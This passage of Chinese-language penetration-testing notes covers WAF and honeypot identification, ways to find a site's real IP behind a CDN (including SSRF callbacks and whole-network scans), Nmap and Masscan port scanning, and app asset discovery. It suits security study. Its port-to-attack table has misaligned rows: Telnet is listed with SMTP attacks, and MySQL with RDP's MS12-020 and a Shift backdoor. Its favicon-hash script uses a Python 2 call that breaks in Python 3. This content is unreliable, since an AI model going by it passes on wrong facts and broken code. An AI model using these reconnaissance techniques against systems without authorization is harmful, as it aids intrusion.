title="WAF识别"></a>WAF识别</h3><p>识别方法</p><ul><li>拦截页面识别：通过观察网站拦截页面特征进行人工判断，不同WAF产品有独特的拦截界面样式</li><li>工具识别：使用自动化工具（如wafw00f）进行检测，支持国内外84种常见WAF产品的识别</li><li>网络空间测绘：通过搜索引擎查询目标网站使用的安全产品信息</li></ul><h4 id="工具识别"><a href="#工具识别" class="headerlink" title="工具识别"></a><strong>工具识别</strong></h4><p><strong>WAFW00F</strong></p><p><a href="https://github.com/EnableSecurity/wafw00f">GitHub - EnableSecurity&#x2F;wafw00f: WAFW00F allows one to identify and fingerprint Web Application Firewall (WAF) products protecting a website.</a></p><p>检测命令：</p><p>进入waf00f文件夹：python main.py 目标URL</p><p>支持列表：工具内置支持阿里云WAF、安全狗、华为云WAF、腾讯云WAF等国内外主流产品</p><p><strong>IdentYwaf</strong></p><p><a href="https://github.com/stamparm/identYwaf">GitHub - stamparm&#x2F;identYwaf: Blind WAF identification tool</a></p><p>检测命令</p><p>Usage: python identYwaf.py [options] &lt;host|url&gt;</p><h4 id="空间测绘平台"><a href="#空间测绘平台" class="headerlink" title="空间测绘平台"></a><strong>空间测绘平台</strong></h4><p>工作原理: 通过爬取互联网设备信息建立数据库</p><p><a href="https://quake.360.net/quake/#/index">360网络空间测绘 — 因为看见，所以安全</a></p><p><a href="https://fofa.info/">网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统</a></p><p><a href="https://hunter.qianxin.com/_blank">鹰图平台(hunter)-奇安信网络空间测绘系统</a></p><h2 id="蜜罐系统"><a href="#蜜罐系统" class="headerlink" title="蜜罐系统"></a>蜜罐系统</h2><p>常见蜜罐系统</p><ul><li>AMUN IMAP蜜罐</li><li>DIONAEA HTTP&#x2F;SMBD&#x2F;MSSQL&#x2F;Memcached&#x2F;FTP蜜罐</li><li>HONEYPY HTTP&#x2F;ES蜜罐</li><li>KIPPO SSH蜜罐</li><li>HFISH蜜罐管理后台</li><li>CONPOTS7工业控制系统蜜罐</li><li>ELASTICSEARCH蜜罐</li><li>WEBLOGIC蜜罐等</li></ul><p>本质：一种安全威胁检测技术，通过引诱和欺骗攻击者来记录其攻击手段</p><p>核心目的</p><ul><li>刻画攻击者画像</li><li>还原攻击手法</li><li>实现时间消耗战术</li></ul><p>分类标准：基于交互程度等级</p><ul><li>低交互蜜罐：仅建立单次连接（”简单玩一下就完了”）</li><li>中交互蜜罐：提供多阶段交互（”再玩一玩”）</li><li>高交互蜜罐：深度持续交互（”很深入的玩，像交朋友一年”）</li></ul><p>核心功能</p><ul><li>节点管理（可自定义开放端口）</li><li>攻击行为记录（包括IP、时间、尝试的凭证等）</li><li>实时攻击态势展示（大屏可视化）</li></ul><p>攻击模拟</p><ul><li>提供虚假登录界面（如admin&#x2F;admin）</li><li>记录所有异常访问尝试</li><li>生成攻击者指纹信息</li></ul><p>识别特征</p><ul><li>非常规端口服务（如4433）</li><li>过于明显的漏洞暴露</li><li>系统响应存在固定模式</li></ul><h3 id="蜜罐识别方法"><a href="#蜜罐识别方法" class="headerlink" title="蜜罐识别方法"></a>蜜罐识别方法</h3><h4 id="浏览器插件识别法"><a href="#浏览器插件识别法" class="headerlink" title="浏览器插件识别法"></a>浏览器插件识别法</h4><p><strong>Heimdallr</strong> </p><p><a href="https://github.com/Ghr07h/Heimdallr">GitHub - Ghr07h&#x2F;Heimdallr: 一款完全被动监听的谷歌插件，用于高危指纹识别、蜜罐特征告警和拦截、机器特征对抗</a></p><p>Heimdallr是一款致力于被动嗅探浏览器流量，用于提示漏洞框架指纹、告警拦截蜜罐请求、对抗浏览器特征追踪（浏览器持久化、webRTC、Canvas画布等）的Chrome插件。</p><ul><li>识别原理：通过检测指纹特征判断是否为蜜罐系统，会显示”敏感信息存在手机号码”等告警提示</li><li>准确性问题：存在较高误报率，例如打开微信公众号文章也可能被误判为蜜罐</li></ul><p><strong>Quake</strong></p><p><a href="https://github.com/360quake/quake_rs">GitHub - 360quake&#x2F;quake_rs: Quake Command-Line Application</a></p><blockquote><p>quake.exe init 【360quake apikey】</p><p>quake.exe honeypot 目标</p><p><img src="/img/xiaodi/image-20250508213352819.png" alt="image-20250508213352819"></p></blockquote><h4 id="空间测绘识别"><a href="#空间测绘识别" class="headerlink" title="空间测绘识别"></a>空间测绘识别</h4><p><a href="https://quake.360.net/quake/#/index">360网络空间测绘 — 因为看见，所以安全</a></p><p><a href="https://fofa.info/">网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统</a></p><p><a href="https://hunter.qianxin.com/_blank">鹰图平台(hunter)-奇安信网络空间测绘系统</a></p><p><img src="https://i-blog.csdnimg.cn/direct/1c9cc1a511ac49b79be2b5705fe79b03.png" alt="img"></p><h4 id="人工识别"><a href="#人工识别" class="headerlink" title="人工识别"></a>人工识别</h4><ul><li>端口特征分析<ul><li>多端口开放：蜜罐通常会开放大量端口（如80&#x2F;81&#x2F;82等连续端口）</li><li>规律性排列：端口号呈现规律性递增（如901&#x2F;902&#x2F;903…）</li><li>非标准端口：避免占用常见应用端口，使用非标准端口模拟服务</li></ul></li><li>Web访问特征<ul><li>协议异常：<strong>用HTTP协议访问非Web服务端口（如MySQL的3306）时会出现下载行为</strong></li><li>设计原理：蜜罐采用JSONP技术传输攻击者输入的账号密码，导致协议解析异常</li></ul></li><li>设备指纹识别<ul><li>特定返回值：不同蜜罐产品有固定指纹特征（如SSH蜜罐有特定banner）</li><li>产品特征库：需要收集整理各蜜罐产品的指纹特征进行比对</li></ul></li></ul><p>综合判定策略</p><ul><li>三重验证法<ul><li>使用网络空间测绘平台（如夸克、鹰图）初步识别</li><li>结合专用工具进行二次验证</li><li>最后通过人工分析端口特征、Web行为等确认</li></ul></li></ul><h2 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h2><h3 id="CDN基本概念"><a href="#CDN基本概念" class="headerlink" title="CDN基本概念"></a><strong>CDN基本概念</strong></h3><ul><li>传统访问模式：用户访问域名→解析服务器IP→直接访问目标主机</li><li>CDN访问模式：用户访问域名→CDN节点→真实服务器IP→访问目标主机</li><li>WAF防护模式：用户访问域名→CDN节点(WAF防护)→真实服务器IP→访问目标主机</li></ul><p><strong>配置方式</strong></p><p>CDN配置要素</p><ul><li>加速域名：需要启用加速的具体域名（如<a href="http://www.xiaodi8.com)/">www.xiaodi8.com）</a></li><li>加速区域：国内&#x2F;海外等不同地区的加速选择</li><li>加速类型：静态资源&#x2F;动态资源等不同类型的内容加速</li></ul><p>IP差异</p><ul><li>传统访问返回真实服务器IP（如47.75.212.15）</li><li>CDN访问返回虚拟节点IP（如202.96.134.33）</li></ul><p>信息收集失效：端口扫描等主机级信息收集会作用于CDN节点而非真实服务器</p><p>业务影响范围：仅影响IP相关资产探测，其他业务数据（如API接口）仍正常交互</p><h3 id="CDN判断技术"><a href="#CDN判断技术" class="headerlink" title="CDN判断技术"></a>CDN判断技术</h3><p><strong>Nslookup</strong></p><p>​Win下使用nslookup命令进行查询，若返回域名解析结果为多个ip，多半使用了CDN，是不真实的ip。</p><p><strong>多地ping查询</strong></p><p>​使用不同区域ping，查看ping的ip结果是否唯一。若不唯一，则目标网站可能存在CDN。</p><p>查询网站：</p><p><a href="https://www.17ce.com/">https://www.17ce.com/</a></p><p><a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></p><p><strong>使用工具直接查询</strong></p><p>查询网站：<a href="https://www.ipip.net/ip.html">https://www.ipip.net/ip.html</a></p><h3 id="CDN绕过技术"><a href="#CDN绕过技术" class="headerlink" title="CDN绕过技术"></a>CDN绕过技术</h3><p><strong>针对子域名未配置CDN、前期未配置过CDN记录</strong></p><p>识别方法</p><ul><li>子域名查询：通过未加速的子域名获取真实IP</li><li>历史记录查询：利用DNS历史解析记录</li><li>证书查询：通过SSL证书信息反查</li></ul><p>工具推荐</p><ul><li>子域名收集：DNSGrep（<a href="https://www.dnsgrep.cn)/">https://www.dnsgrep.cn）</a></li><li>网络空间测绘：fofa.so、quake.360.cn</li><li>备案查询：<a href="https://www.yunsee.cn/">https://www.yunsee.cn</a></li></ul><p><strong>针对CDN配置的加速域名范围</strong></p><p>绕过原理：当加速区域限定为中国内地时，海外访问请求会直连源站</p><p>绕过方法</p><ul><li>检查历史解析记录（DNS缓存投毒）</li><li>利用子域名加速配置缺陷（如bbs.baidu.com未加速）</li><li>国外节点请求（部分CDN未部署海外节点）</li></ul><p>工具推荐</p><ul><li>超级Ping工具：<a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></li><li>全球节点检测：<a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></li><li>IP反查接口：<a href="https://get-site-ip.com/">https://get-site-ip.com/</a></li></ul><h4 id="子域名入手"><a href="#子域名入手" class="headerlink" title="子域名入手"></a>子域名入手</h4><p>针对子域名未配置CDN、CDN配置的限定加速域名范围</p><p>​1、有些站点的主站使用了CDN，或者部分域名使用了CDN，某些子域名可能未使用。</p><p>​2、主站可能只配置了中国地区加速，未配置其他地区加速</p><p>绕过方法：</p><ol><li>使用子域名爆破，查询存在的子域名</li><li>使用工具进行检测<ol><li>超级Ping工具：<a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></li><li>全球节点检测：<a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></li><li>子域名收集：DNSGrep（<a href="https://www.dnsgrep.cn)/">https://www.dnsgrep.cn）</a></li><li>网络空间测绘：fofa.so、quake.360.cn</li><li>备案查询：<a href="https://www.yunsee.cn/">https://www.yunsee.cn</a></li></ol></li></ol><h4 id="FOFA-icon-hash"><a href="#FOFA-icon-hash" class="headerlink" title="FOFA icon_hash"></a>FOFA icon_hash</h4><p>编写python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mmh3</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hashico</span>(<span class="params">url</span>):</span><br><span class="line">target=url+<span class="string">&quot;/favicon.ico&quot;</span></span><br><span class="line">response = requests.get(url=target,verify=<span class="literal">False</span>)</span><br><span class="line">favicon = response.content.encode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line"><span class="built_in">hash</span> = mmh3.<span class="built_in">hash</span>(favicon)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hash</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">hashico(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>使用</p><p><img src="/img/xiaodi/8295cf793d2392601c429a5a56115c5b.png" alt="img"></p><p>之后结合fofa快速定位目标相关资产：</p><p><img src="/img/xiaodi/f9a597a030e24dfb1e568c439c6bcfb3.png" alt="img"></p><h4 id="利用网站漏洞"><a href="#利用网站漏洞" class="headerlink" title="利用网站漏洞"></a>利用网站漏洞</h4><p>定义：利用网站存在的功能漏洞（如SSRF），使服务器主动向外发起请求暴露真实IP</p><p>典型漏洞</p><ul><li>SSRF漏洞：服务器端请求伪造，可强制服务器访问指定URL</li><li>远程图片加载：文章发布&#x2F;头像设置等需要加载外部资源的功能</li></ul><p>实现原理：构造特殊请求让服务器主动连接攻击者控制的监听服务器，通过访问日志获取真实IP</p><p><strong>注意：需要配置web服务器来接收服务器的访问</strong></p><h4 id="遗留文件"><a href="#遗留文件" class="headerlink" title="遗留文件"></a>遗留文件</h4><p>使用web目录结构扫描爆破、获取相关的服务器配置信息文件</p><ul><li>调试文件：phpinfo.php（SERVER_ADDR、HTTP_HOST）等包含服务器配置信息的文件</li><li>配置文件：web.config、.env等可能包含IP信息的文件</li><li>版本说明：README.md、CHANGELOG等开发文档</li></ul><p>该方法具有偶然性，依赖管理员未删除调试文件</p><h4 id="特殊端口-历史记录"><a href="#特殊端口-历史记录" class="headerlink" title="特殊端口&#x2F;历史记录"></a>特殊端口&#x2F;历史记录</h4><p>特殊端口：尝试访问非标准端口（如8080、8443）的服务</p><p>查询ip与域名绑定历史记录，可能会发现使用CDN之前的目标ip</p><p>历史记录：查找网站早期未使用CDN时的DNS解析记录</p><p>查询网站</p><blockquote><p><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></p><p><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p><p><a href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a></p><p><a href="http://viewdns.info/">http://viewdns.info/</a></p><p><a href="http://www.17ce.com/">http://www.17ce.com/</a></p><p><a href="https://community.riskiq.com/">https://community.riskiq.com/</a></p><p><a href="http://www.crimeflare.com/cfssl.html">http://www.crimeflare.com/cfssl.html</a></p></blockquote><h4 id="邮件系统"><a href="#邮件系统" class="headerlink" title="邮件系统"></a>邮件系统</h4><p>寻找真实IP的原理：通过邮件系统寻找真实IP主要基于两点：一是邮件服务器通常不做CDN服务；二是邮件通信具有主动发送的特性。</p><p>不做CDN的原因</p><ul><li>邮件系统使用MX记录类型，而CDN服务通常只支持CNAME记录和A记录</li><li>部分厂商不支持MX记录做CDN加速服务</li></ul><p><strong>实现方法</strong></p><p>被动接收法</p><ul><li>触发网站发送邮件的功能（如找回密码、用户注册、邮件订阅等）</li><li>查看邮件原文中的Received字段获取发送方IP</li><li>示例：通过”忘记密码”功能让网站发送验证邮件</li></ul><p>主动发送法</p><ul><li>向目标域名的不存在邮箱地址发送邮件</li><li>接收退回邮件获取真实IP</li><li>注意：此方法需使用自建邮件服务器，第三方邮箱（如QQ）会屏蔽真实IP</li></ul><blockquote><p>有效性验证</p><ul><li>发件人邮箱必须使用目标域名（如<a href="mailto:&#120;&#120;&#x78;&#64;&#x74;&#97;&#x72;&#103;&#x65;&#116;&#x2e;&#x63;&#x6f;&#109;">&#120;&#120;&#x78;&#64;&#x74;&#97;&#x72;&#103;&#x65;&#116;&#x2e;&#x63;&#x6f;&#109;</a>）</li><li>不能是第三方邮箱服务（如126、QQ等）</li></ul><p>IP验证</p><ul><li>查看邮件头中的Received字段</li><li>确认IP是否属于目标域名所有</li></ul><p><img src="/img/xiaodi/image-20250509111110523.png" alt="image-20250509111110523"></p></blockquote><h4 id="国外查询接口"><a href="#国外查询接口" class="headerlink" title="国外查询接口"></a>国外查询接口</h4><p>通过国外得一些冷门得DNS或IP去请求目标，很多时候国内得CDN对国外得覆盖面并不是很广，故此可以利用此特点进行探测。 通过国外代理访问就能查看真实IP了，或者通过国外的DNS解析，可能就能得到真实的IP查询网站</p><p>IP反查接口：<a href="https://get-site-ip.com/">https://get-site-ip.com/</a></p><p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p><p>IP接口合集：<a href="https://github.com/ihmily/ip-info-api">https://github.com/ihmily/ip-info-api</a></p><h4 id="全网扫描"><a href="#全网扫描" class="headerlink" title="全网扫描"></a>全网扫描</h4><p>定义：当常规方法无法获取真实IP时采用的终极手段，通过特殊标识符在全网寻找相似IP节点</p><p>成功率：完全取决于扫描范围和精度，属于”没有办法的办法”</p><p>类比：与”以量打量”原理相似，都是通过消耗资源来获取真实信息</p><ol><li>判断CDN厂商、备案信息</li><li>使用纯真IP库进行信息查询（如：阿里云）</li><li>使用工具对查询的IP段进行扫描<ol><li><a href="https://github.com/Tai7sy/fuckcdn?tab=readme-ov-file">GitHub - Tai7sy&#x2F;fuckcdn: CDN真实IP扫描，易语言开发</a><ol><li>扫描IP段中开放指定端口的设备（详细见github）</li><li>访问开放端口验证关键字</li><li>保存匹配结果到result.txt</li></ol></li></ol></li></ol><p>其他工具：</p><p>​<a href="https://github.com/Pluto-123/Bypass_cdn">https://github.com/Pluto-123/Bypass_cdn</a></p><h1 id="主机架构分析"><a href="#主机架构分析" class="headerlink" title="主机架构分析"></a>主机架构分析</h1><p>常见服务</p><ul><li>常见类型：Apache、Nginx、IIS、lighttpd等</li><li>应用服务器：Tomcat、Jboss、Weblogic、Websphere等</li><li>数据库服务：Mysql、SqlServer、Oracle、Redis、MongoDB等</li></ul><p><strong>web服务器</strong></p><p>识别方法</p><p>Server字段识别（通过HTTP响应头中的Server字段可以判断服务器类型）</p><ul><li>Server: Apache&#x2F;2.4.46 (Win32) OpenSSL&#x2F;1.1.1g mod_fcgid&#x2F;2.3.9a 表示Apache服务器</li><li>该方法简单直接，是识别WEB服务器最常用的方式</li></ul><p>使用指纹识别工具</p><p><strong>应用服务器</strong></p><p>​定义: 应用服务器是中间件的一种特殊类型，主要用于支持特定语言开发的应用程序运行。</p><p>​常见类型: Tomcat、Jboss、Weblogic、Websphere等，这些通常与Java应用相关。</p><p>与Web服务器区别</p><ul><li>端口特性: 应用服务器安装后会默认开放特定端口（如Tomcat默认8080，Weblogic默认7001），而Web服务器通常使用80&#x2F;443端口。</li><li>业务支持: 应用服务器针对特定语言开发的程序（如Java）有更好的支持性，例如Weblogic对Java应用的支持优于IIS。</li></ul><p>识别方法</p><ul><li>端口扫描: 必须通过端口扫描识别，无法像Web服务器那样通过浏览器返回包判断。</li><li>常见端口<ul><li>7001: Weblogic</li><li>8080: Jboss&#x2F;Tomcat</li><li>8009: Tomcat AJP协议</li><li>9080-9081: Websphere</li></ul></li></ul><p>​</p><p><strong>数据库服务</strong></p><ul><li>关系型数据库: MySQL、SQL Server、Oracle等</li><li>非关系型数据库: Redis、MongoDB等</li><li>渗透测试关注点<ul><li>MySQL: 注入提权、爆破</li><li>Redis: 未授权访问、弱口令爆破</li><li>MongoDB: 爆破、未授权访问（默认端口27017）</li></ul></li><li>关键端口服务<ul><li>22&#x2F;SSH: 爆破、隧道转发</li><li>23&#x2F;Telnet: 路由设备弱口令</li><li>25&#x2F;SMTP: 邮件伪造</li><li>53&#x2F;DNS: 区域传送攻击</li><li>80-89&#x2F;Web: 中间件漏洞利用</li><li>11211&#x2F;Memcached: 未授权访问</li></ul></li></ul><p><strong>内网环境特征</strong></p><ul><li>业务端口部分映射到外网</li><li>造成”看到的≠实际的”现象</li><li>典型场景：<ul><li>Web端口80映射成功</li><li>数据库端口3306未映射</li></ul></li></ul><p>解决方案</p><ul><li>无直接解决办法</li><li>需结合其他信息收集手段</li><li>重要提示：扫描结果需结合架构分析</li></ul><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><table><thead><tr><th>端口&#x2F;端口范围</th><th>协议</th><th>服务&#x2F;用途</th><th>渗透测试用途</th></tr></thead><tbody><tr><td>20,21</td><td>TCP</td><td>FTP</td><td>匿名上传下载、爆破、嗅探、提权（如ProFTPd 1.3.5）、后门利用、中间人攻击（v1）、SSH隧道&#x2F;内网代理、文件传输</td></tr><tr><td>22</td><td>TCP</td><td>SSH</td><td>爆破、嗅探、路由&#x2F;交换机弱口令</td></tr><tr><td>23</td><td>TCP</td><td>Telnet</td><td>邮件伪造、VRFY&#x2F;EXPN查询用户信息（smtp-user-enum工具）</td></tr><tr><td>25</td><td>TCP</td><td>SMTP</td><td>邮件伪造、用户信息枚举</td></tr><tr><td>53</td><td>TCP&#x2F;UDP</td><td>DNS</td><td>区域传送漏洞、DNS劫持&#x2F;缓存投毒&#x2F;欺骗、DNS隧道远控</td></tr><tr><td>69</td><td>TCP&#x2F;UDP</td><td>TFTP</td><td>配置文件下载</td></tr><tr><td>80-89,443,8080-8089</td><td>TCP</td><td>Web服务</td><td>TopN漏洞、VPN&#x2F;OWA&#x2F;Webmail&#x2F;OA漏洞、中间件&#x2F;框架漏洞、Java控制台、Web管理面板、爆破&#x2F;嗅探</td></tr><tr><td>110</td><td>TCP</td><td>POP3</td><td>权限配置不当</td></tr><tr><td>111,2049</td><td>TCP</td><td>NFS&#x2F;Samba</td><td>爆破、远程执行漏洞（如MS08-067、MS17-010）、嗅探</td></tr><tr><td>137,139,445</td><td>TCP</td><td>SMB</td><td>爆破、远程执行漏洞</td></tr><tr><td>161</td><td>UDP</td><td>SNMP</td><td>默认团体字符串爆破、内网信息搜集</td></tr><tr><td>389</td><td>TCP</td><td>LDAP</td><td>注入攻击、匿名访问、弱口令爆破</td></tr><tr><td>512,513,514</td><td>TCP</td><td>Rexec&#x2F;Rlogin</td><td>Linux远程执行、匿名访问</td></tr><tr><td>873</td><td>TCP</td><td>Rsync</td><td>未授权访问、文件上传</td></tr><tr><td>1194</td><td>TCP</td><td>OpenVPN</td><td>弱口令、信息泄露、爆破</td></tr><tr><td>1352</td><td>TCP</td><td>Lotus</td><td>注入、提权</td></tr><tr><td>1433</td><td>TCP</td><td>SQL Server</td><td>SA弱口令、爆破、TNS注入、弹Shell</td></tr><tr><td>1521</td><td>TCP</td><td>Oracle</td><td>弱口令爆破</td></tr><tr><td>1723</td><td>TCP</td><td>PPTP</td><td>爆破、VPN钓鱼</td></tr><tr><td>2082,2083</td><td>TCP</td><td>cPanel</td><td>弱口令、未授权访问</td></tr><tr><td>2181</td><td>TCP</td><td>ZooKeeper</td><td>默认密码访问</td></tr><tr><td>2601,2604</td><td>TCP</td><td>Zebra</td><td>弱口令</td></tr><tr><td>3128</td><td>TCP</td><td>Squid</td><td>弱口令、Kangle代理</td></tr><tr><td>3306</td><td>TCP</td><td>MySQL</td><td>Shift后门（需Windows 2003以下）、爆破、MS12-020漏洞</td></tr><tr><td>3389</td><td>TCP</td><td>RDP</td><td>爆破、MS12-020漏洞</td></tr><tr><td>3690</td><td>TCP</td><td>SVN</td><td>SVN泄露、未授权访问</td></tr><tr><td>4848</td><td>TCP</td><td>GlassFish</td><td>爆破、注入</td></tr><tr><td>5000</td><td>TCP</td><td>Sybase&#x2F;DB2</td><td>爆破、注入、弱口令</td></tr><tr><td>5432</td><td>TCP</td><td>PostgreSQL</td><td>弱口令、注入</td></tr><tr><td>5900-5902</td><td>TCP</td><td>VNC</td><td>弱口令爆破、未授权命令执行</td></tr><tr><td>5984</td><td>TCP</td><td>CouchDB</td><td>未授权访问、弱口令爆破</td></tr><tr><td>6379</td><td>TCP</td><td>Redis</td><td>Java反序列化、弱口令</td></tr><tr><td>7001,7002</td><td>TCP</td><td>WebLogic</td><td>控制台弱口令、反序列化漏洞</td></tr><tr><td>7778</td><td>TCP</td><td>Kloxo</td><td>弱口令</td></tr><tr><td>8000</td><td>TCP</td><td>Ajenti</td><td>管理面板漏洞</td></tr><tr><td>8009</td><td>TCP</td><td>Tomcat AJP</td><td>AJP协议漏洞（如CVE-2020-1938）</td></tr><tr><td>8443</td><td>TCP</td><td>Plesk</td><td>远程执行、SQL注入</td></tr><tr><td>8069</td><td>TCP</td><td>Zabbix</td><td>反序列化、控制台弱口令</td></tr><tr><td>8080-8089</td><td>TCP</td><td>Jenkins&#x2F;JBoss&#x2F;WebSphere</td><td>反序列化、控制台弱口令</td></tr><tr><td>9080-9081,9090</td><td>TCP</td><td>WebSphere</td><td>远程执行漏洞</td></tr><tr><td>9200,9300</td><td>TCP</td><td>ElasticSearch</td><td>未授权访问</td></tr><tr><td>11211</td><td>TCP</td><td>Memcached</td><td>未授权访问、爆破</td></tr><tr><td>27017,27018</td><td>TCP</td><td>MongoDB</td><td>默认未授权访问</td></tr><tr><td>50070,50030</td><td>TCP</td><td>Hadoop</td><td>未授权访问、命令执行</td></tr></tbody></table><p>收集方式：</p><ul><li>主动收集：通过自身工具发送请求并分析返回信息（如Nmap、Masscan）</li><li>被动收集：通过第三方平台查询目标信息（如网络空间）</li></ul><p>工具分类：目前最常用的三种端口扫描工具是网络空间、Nmap和Masscan</p><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><ul><li>基本介绍：老牌安全扫描工具，提供图形化界面（Zenmap）和命令行版本</li><li>扫描模式<ul><li>Intense scan：常规扫描模式</li><li>Intense scan plus UDP：扫描所有TCP&#x2F;UDP端口</li><li>Intense scan no ping：不带ping的扫描</li><li>Quick scan：快速扫描模式</li><li>Quick scan plus：增强版快速扫描（最常用）</li></ul></li><li>常用参数<ul><li>-T4：设置扫描速度</li><li>-A：启用操作系统检测和版本检测</li><li>-v：显示详细输出</li><li>-sV：探测服务版本</li><li>-O：操作系统检测</li></ul></li><li>特点：扫描结果全面但耗时较长</li></ul><p>扫描状态：</p><ul><li>open：服务正在监听该端口</li><li>closed：端口可达但无服务监听</li><li>filtered：端口被防火墙&#x2F;安全设备阻断</li></ul><h3 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan"></a>Masscan</h3><ul><li>编译环境：需要使用Visual Studio进行编译</li><li>参考资源<ul><li>官方下载：<a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></li></ul></li><li>特点：扫描速度极快，适合大规模扫描任务</li></ul><p>编译方法：</p><p><strong>下载源码</strong>：从GitHub下载Masscan的源码。</p><p><strong>安装编译器</strong>：使用Visual Studio 2019进行编译（其他版本也可，但需自行调整配置）。</p><p>配置编译环境</p><ul><li><p>在<code>Source Files-&gt;misc-&gt;string_s.h</code>中添加编译配置，根据编译器版本修改<code>_MSC_VER</code>的值。</p></li><li><p>选择Release模式编译</p></li><li><p>点击”生成解决方案”生成exe文件</p></li><li><p>编译输出：成功编译后在bin目录生成masscan.exe可执行文件</p></li></ul><p>基本语法</p><ul><li>masscan -p&lt;端口&gt; &lt;IP&gt;</li><li>例：masscan -p80 10.0.0.0&#x2F;8</li></ul><p>多端口扫描</p><ul><li>支持逗号分隔和范围指定</li><li>例：masscan -p80,8000-8100 10.0.0.0&#x2F;8</li></ul><p>结果输出</p><ul><li>-oB：二进制格式输出</li><li>-oX：XML格式输出</li></ul><h3 id="空间测绘平台-1"><a href="#空间测绘平台-1" class="headerlink" title="空间测绘平台"></a>空间测绘平台</h3><p>工作原理: 通过爬取互联网设备信息建立数据库</p><p><a href="https://quake.360.net/quake/#/index">360网络空间测绘 — 因为看见，所以安全</a></p><p><a href="https://fofa.info/">网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统</a></p><p><a href="https://hunter.qianxin.com/_blank">鹰图平台(hunter)-奇安信网络空间测绘系统</a></p><p>1、输入端口扫描的IP</p><p>2、使用IP聚合</p><p><img src="/img/xiaodi/image-20250508205332264.png" alt="image-20250508205332264"></p><h1 id="APP资产"><a href="#APP资产" class="headerlink" title="APP资产"></a>APP资产</h1><h2 id="搜集APP资产"><a href="#搜集APP资产" class="headerlink" title="搜集APP资产"></a>搜集APP资产</h2><p>爱企查 </p><p>​<a href="https://aiqicha.baidu.com/index/index">爱企查-工商查询_专业企业信息查询平台_公司查询_老板查询_工商信息查询系统</a></p><ul><li>查询方法：通过企业名称在知识产权栏查询软件著作权信息</li><li>案例演示：查询”中邮邮惠万家银行”显示3个APP：邮惠万商APP、邮惠万村app、邮惠万家银行App</li><li>会员获取：可在拼多多购买7天试用超级会员（1元）</li></ul><p>小蓝本</p><p>​<a href="https://sou.xiaolanben.com/pc">小蓝本-商业信息搜索</a></p><ul><li>特点：免费使用，支持地区筛选</li><li>查询语法：关键词+空格+地区&#x3D;地区筛选</li><li>案例结果：查询到”邮惠万家银行”APP信息</li></ul><p>七麦数据</p><p>​<a href="https://www.qimai.cn/">七麦数据 -专业移动产品商业分析平台-关键词优化-ASA优化-七麦科技</a></p><ul><li>功能：支持iOS&#x2F;安卓双平台查询</li><li>局限性：查询结果相对较少，需配合其他平台使用</li><li>会员价格：350元&#x2F;月（较贵）</li></ul><p>点点数据</p><p>​<a href="https://app.diandian.com/">点点数据-App数据查询分析,AppStore排行榜,ASO,ASM优化平台</a></p><ul><li>优势：数据量最全，支持多维度分析</li><li>功能：可查看开发者其他应用、版本历史等</li><li>案例：查询”隆基绿能”发现3个相关APP</li></ul><p><strong>查询技巧</strong></p><ul><li>多平台交叉验证<ul><li>必要性：不同平台收录结果可能不同（如点点查到3个APP，七麦只查到2个）</li><li>验证方法：至少使用2个平台进行比对</li></ul></li><li>开发者关联查询<ul><li>操作路径：点击APP详情页的”开发者”信息</li><li>作用：可发现目标企业开发的其他关联APP</li></ul></li></ul><h2 id="从APP提取资产"><a href="#从APP提取资产" class="headerlink" title="从APP提取资产"></a>从APP提取资产</h2><h3 id="抓包提取"><a href="#抓包提取" class="headerlink" title="抓包提取"></a>抓包提取</h3><p>通过抓取APP运行时的网络数据包获取敏感信息</p><ul><li>资产信息：IP地址、域名、网站、接口等基础设施</li><li>泄露信息：配置密钥(k)、源码资源文件等敏感数据</li><li>代码信息：Java代码安全问题等程序实现细节</li></ul><p>优缺点：</p><ul><li>优点<ul><li>获取的数据都是实际使用的</li><li>没有”假阳性”结果</li></ul></li><li>缺点<ul><li>无法获取未触发的功能</li><li>需要人工操作可能遗漏部分功能</li><li>对复杂APP覆盖率有限</li></ul></li></ul><h3 id="反编译提取"><a href="#反编译提取" class="headerlink" 